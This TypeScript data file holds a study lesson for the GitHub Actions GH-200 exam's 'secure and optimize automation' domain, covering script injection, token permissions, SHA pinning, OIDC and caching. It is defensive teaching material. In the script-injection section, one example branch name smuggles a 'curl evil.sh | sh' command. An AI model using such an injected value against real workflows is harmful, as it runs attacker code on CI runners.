import type { Domain } from '../types';

/**
 * GH-200 domain 5 — Secure and optimize automation (10–15%).
 *
 * The domain that audits all the others: script injection, the
 * GITHUB_TOKEN's lifecycle and least-privilege permissions, SHA pinning and
 * allow lists under immutable actions, environment approvals, OIDC
 * federation, artifact attestations — then caching, retention, and
 * concurrency as the cost and performance levers.
 */
export const domain: Domain = {
  id: 'gh200-d5',
  cert: 'gh200',
  number: 5,
  title: 'Secure and optimize automation',
  weightMin: 10,
  weightMax: 15,
  summary:
    'Script injection, GITHUB_TOKEN permissions vs PAT, OIDC federation, SHA pinning, allow lists and reviewers, environment approvals, artifact attestations, caching and retention.',
  subSkills: [
    {
      id: 'd5-environments',
      title: 'Environment protections and approval gates',
      docIds: ['manage-environments'],
    },
    {
      id: 'd5-trustworthy-actions',
      title: 'Identify trustworthy actions from the Marketplace',
      docIds: ['github-marketplace', 'secure-use'],
    },
    {
      id: 'd5-script-injection',
      title: 'Mitigate script injection',
      docIds: ['secure-use'],
    },
    {
      id: 'd5-token-permissions',
      title: 'GITHUB_TOKEN lifecycle, granular permissions, vs PAT',
      docIds: ['github-token', 'secure-use'],
    },
    {
      id: 'd5-oidc',
      title: 'OIDC token federation with id-token permission',
      docIds: ['openid-connect'],
    },
    {
      id: 'd5-pinning',
      title: 'Pin third-party actions to full commit SHAs',
      docIds: ['secure-use'],
    },
    {
      id: 'd5-usage-policy',
      title: 'Allow/deny lists and required reviewers for actions',
      docIds: ['org-actions-policy'],
    },
    {
      id: 'd5-attestations',
      title: 'Artifact attestations and provenance (SLSA)',
      docIds: ['artifact-attestations'],
    },
    {
      id: 'd5-cost-optimization',
      title: 'Caching, retention, and scaling for cost and performance',
      docIds: ['dependency-caching', 'billing-actions'],
    },
  ],
  lesson: {
    id: 'lesson-gh200-d5',
    domainId: 'gh200-d5',
    title: 'Secure and optimize automation',
    minutes: 18,
    blocks: [
      { kind: 'h3', text: 'The threat model for CI/CD' },
      {
        kind: 'p',
        text: 'Three recurring attacks drive this domain, and [security hardening](secure-use) is the reference for all three. **Injection**: untrusted text (a PR title, branch name, or issue body) reaches a shell. **Supply chain**: a dependency or action version changes under you — a tag can be repointed, which immutable actions now prevent by freezing releases, making your pinning choice the control that still matters. **Over-privilege**: the workflow token can write more than the job needs, so one injected command exfiltrates or destroys. Every control below answers one of those three.',
      },
      { kind: 'h3', text: 'Script injection: the interpolation attack' },
      {
        kind: 'p',
        text: '`${{ }}` expansion happens **before** the shell parses the script — so an expression carrying attacker-controlled text becomes part of the command. A branch named `feat"; curl evil.sh | sh; echo "` stops being a string the moment it is interpolated into `run:`. The mitigations, in the order the exam lists them: **validate and sanitize inputs**; put untrusted values in an `env:` block and read them as an environment variable (`"$TITLE"`), so the shell treats them as data; **prefer vetted actions over inline scripts** for anything touching untrusted input; and quote shell variables always.',
      },
      {
        kind: 'code',
        language: 'yaml',
        code: '# BAD — the PR title is spliced into the script before bash parses it\n- run: echo "${{ github.event.pull_request.title }}"\n\n# GOOD — the title arrives as a quoted environment variable instead\n- env:\n    PR_TITLE: ${{ github.event.pull_request.title }}\n  run: printf "%s\\n" "$PR_TITLE"',
      },
      {
        kind: 'tip',
        text: 'The exam phrasing: `${{ }}` is expanded by the runner **before** the step’s shell starts — quoting inside the `run:` string cannot save an interpolated expression. The safe pattern is expression → `env:` → `$VARIABLE`.',
      },
      { kind: 'h3', text: 'The GITHUB_TOKEN: ephemeral, scoped, revocable' },
      {
        kind: 'p',
        text: 'Every job gets a [GITHUB_TOKEN](github-token) minted for that job: it **expires when the job ends**, is scoped to the repository (plus `GITHUB_TOKEN`-readable metadata), and cannot be used from outside the run. Contrast a **PAT**: user-backed, long-lived, valid everywhere the user is — the exact properties that make leakage catastrophic. The control is the `permissions:` block: set it at workflow or job level to grant only what a job uses, and set the repository default to **read-only** so workflows must ask for write. A deploy job that only pushes an artifact needs `contents: read` — nothing else.',
      },
      {
        kind: 'code',
        language: 'yaml',
        code: 'permissions: {}        # default: nothing — jobs opt in\njobs:\n  build:\n    permissions:\n      contents: read      # clone only\n  release:\n    needs: build\n    permissions:\n      contents: write      # tag and release\n',
      },
      { kind: 'h3', text: 'Pin, allowlist, review' },
      {
        kind: 'p',
        text: 'Referencing `uses: someone/action@v3` trusts that the tag keeps pointing at the code you audited — tags are movable, and with immutable actions frozen at release, the durable reference is the **full 40-character commit SHA**. Layer that with the [organization policy](org-actions-policy) tools: allow lists that admit only chosen actions or verified creators, and **required reviewers** so actions outside the allowed set need approval before a workflow may use them. When picking from the [Marketplace](github-marketplace), read the signal set: verified publisher, open source repository, and what the action actually does with its inputs.',
      },
      {
        kind: 'code',
        language: 'yaml',
        code: '# pinned to the full commit SHA — the version that was audited\n- uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5.0.0\n',
      },
      { kind: 'h3', text: 'Environments, approvals, OIDC' },
      {
        kind: 'p',
        text: 'An [environment](manage-environments) is a named deployment target (`production`, `staging`) that can require **reviewers** before any of its jobs start, wait a timer, restrict which branches may deploy, and hold its own secrets — the natural home for "a human approves production". For cloud access, drop long-lived cloud keys entirely with [OIDC](openid-connect): grant `permissions: id-token: write`, and the runner mints a short-lived token your cloud provider accepts against a preconfigured trust policy — the credential never exists in GitHub and never expires on a calendar.',
      },
      {
        kind: 'code',
        language: 'yaml',
        code: 'deploy:\n  needs: build\n  runs-on: ubuntu-latest\n  environment:\n    name: production        # protection rules apply here\n    url: https://example.com\n  permissions:\n    id-token: write         # mint the OIDC token\n    contents: read\n  steps:\n    - uses: actions/checkout@v4\n    - run: ./deploy.sh       # cloud CLI exchanges the OIDC token',
      },
      { kind: 'h3', text: 'Attest what you build' },
      {
        kind: 'p',
        text: '[Artifact attestations](artifact-attestations) sign the build’s **provenance** — where the artifact came from, on what commit, by which workflow — so a consumer can verify the artifact they deploy is the one CI produced, the practical application of the SLSA provenance model. Generate at build time, verify at deploy or release time (`gh attestation verify`), and treat the attestation as the bridge between "CI passed" and "this exact file is trustworthy".',
      },
      { kind: 'h3', text: 'Spend less, run faster' },
      {
        kind: 'p',
        text: 'The same levers serve cost and speed, and [billing](billing-actions) counts the minutes. **Cache** dependencies keyed on lockfiles so installs skip downloads. **Trim matrices** — every combination bills, and `fail-fast` cancels wasted siblings. **Shorten retention** (`retention-days`) for bulky artifacts, or delete them via the REST API after the consumer fetched them. **`concurrency`** cancels the now-stale run when a newer push lands — the standard `cancel-in-progress: true` on pull-request workflows.',
      },
      {
        kind: 'code',
        language: 'yaml',
        code: 'concurrency:\n  group: pr-${{ github.event.pull_request.number }}\n  cancel-in-progress: true   # a newer push obsoletes this run\n\n# inside the job: short retention for big artifacts\n- uses: actions/upload-artifact@v4\n  with:\n    name: dist\n    path: dist\n    retention-days: 7',
      },
      { kind: 'h3', text: 'Before you move on' },
      {
        kind: 'list',
        items: [
          'Injection: `${{ }}` expands before the shell parses — route untrusted values through `env:` and quote.',
          'GITHUB_TOKEN is per-job and ephemeral; PAT is user-backed and long-lived. Default token to read-only; jobs opt in with `permissions:`.',
          'Pin actions to full commit SHAs; allow lists and required reviewers control what `uses:` may resolve.',
          'Environments gate deployments with reviewers, branch restrictions, wait timers, and environment-scoped secrets.',
          'OIDC (`id-token: write` + cloud trust policy) replaces long-lived cloud credentials.',
          'Attestations prove provenance; caching, matrix pruning, retention windows, and `cancel-in-progress` cut cost.',
        ],
      },
    ],
  },
};
